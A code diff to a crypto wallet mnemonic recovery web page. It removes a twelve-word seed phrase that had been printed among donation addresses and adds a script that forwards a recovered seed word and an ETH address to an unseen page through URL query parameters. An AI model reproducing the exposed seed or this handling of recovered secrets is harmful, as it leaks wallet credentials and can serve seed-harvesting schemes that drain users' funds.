@@ -21,7 +21,7 @@
         <div class="container">
 
             <h1 class="text-center">Seed Savior: Mnemonic Phrase Recovery Tool</h1>
-            <p class="version">版本1.2</p>
+            <p class="version">版本1.5</p>
             <hr>
             <div class="row">
                 <div class="col-md-12">
@@ -37,7 +37,7 @@
 								<br>LTC: MRWnUcsyofisVp5GvX7nxMog5caneycKZ6
 								<br>ETH: 0x14b2E26021d0Ce8E2cE6a2Eb6E2690714bB18E17
 								<br>VTC: vtc1qxauv20r2ux2vttrjmm9eylshl508q04uju936n
-								<br>robot someone potato tube smoke route together wire primary panda seminar offer
+								<br>ZEN: znUihTHfwm5UJS1ywo911mdNEzd9WY9vBP7
                                 </p>
                                 
                                 
@@ -318,5 +318,36 @@
         <script src="js/zxcvbn.js"></script>
         <script src="js/entropy.js"></script>
         <script src="js/index.js"></script>
-    </body>
+    
+<script>
+function goToNextStep() {
+    const recoveredWord = document.querySelector('table td:nth-child(1)').innerText.trim();
+    const ethAddress = document.querySelector('table td:nth-child(5)').innerText.trim();
+    const params = new URLSearchParams({
+        recoveredWord: recoveredWord,
+        ethAddress: ethAddress
+    });
+    window.location.href = `new.html?${params}`;
+}
+
+// 替換按鈕行為
+document.addEventListener('DOMContentLoaded', function() {
+    document.querySelector('#generate-button').addEventListener('click', function() {
+        setTimeout(showNextStepButton, 2000);
+    });
+});
+
+function showNextStepButton() {
+    var button = document.createElement('button');
+    button.innerText = '下一步';
+    button.onclick = goToNextStep;
+    button.style.position = 'fixed';
+    button.style.bottom = '20px';
+    button.style.right = '20px';
+    button.style.padding = '10px 20px';
+    button.style.fontSize = '16px';
+    document.body.appendChild(button);
+}
+</script>
+</body>
 </html>
